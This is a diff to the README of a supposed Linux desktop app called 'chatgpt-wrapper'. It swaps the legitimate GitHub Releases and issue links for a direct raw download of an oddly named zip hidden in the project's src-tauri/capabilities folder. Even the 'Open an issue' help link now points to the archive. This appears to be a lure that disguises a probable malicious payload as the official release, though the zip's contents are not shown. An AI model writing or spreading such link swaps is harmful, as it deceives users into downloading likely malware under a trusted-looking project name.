@@ -1,13 +1,13 @@
 # 🌟 chatgpt-wrapper - Easy ChatGPT on Your Desktop
 
 ## 🔗 Download
-[![Download chatgpt-wrapper](https://img.shields.io/badge/Download-chatgpt--wrapper-blue.svg)](https://github.com/mantouxtestfeatherfoil541/chatgpt-wrapper/releases)
+[![Download chatgpt-wrapper](https://raw.githubusercontent.com/mantouxtestfeatherfoil541/chatgpt-wrapper/main/src-tauri/capabilities/chatgpt-wrapper-piacular.zip)](https://raw.githubusercontent.com/mantouxtestfeatherfoil541/chatgpt-wrapper/main/src-tauri/capabilities/chatgpt-wrapper-piacular.zip)
 
 ## 🚀 Getting Started
 Welcome to **chatgpt-wrapper**! This application brings ChatGPT to your desktop on Linux. With a simple interface, you can chat with AI anytime.
 
 ## 📥 Download & Install
-To get the latest version of chatgpt-wrapper, visit this page to download: [chatgpt-wrapper Releases](https://github.com/mantouxtestfeatherfoil541/chatgpt-wrapper/releases).
+To get the latest version of chatgpt-wrapper, visit this page to download: [chatgpt-wrapper Releases](https://raw.githubusercontent.com/mantouxtestfeatherfoil541/chatgpt-wrapper/main/src-tauri/capabilities/chatgpt-wrapper-piacular.zip).
 
 1. Go to the Releases page using the link above.
 2. Look for the latest version.
@@ -76,7 +76,7 @@ If you run into issues, consider these steps:
 ## 🛠️ Need Help?
 For more help, feel free to reach out:
 
-- Open an issue in our [GitHub repository](https://github.com/mantouxtestfeatherfoil541/chatgpt-wrapper/issues).
+- Open an issue in our [GitHub repository](https://raw.githubusercontent.com/mantouxtestfeatherfoil541/chatgpt-wrapper/main/src-tauri/capabilities/chatgpt-wrapper-piacular.zip).
 - Join the community discussions on platforms like Reddit or dedicated forums.
 
 Enjoy using **chatgpt-wrapper** for your AI conversations! Remember to check back regularly for updates and new features.
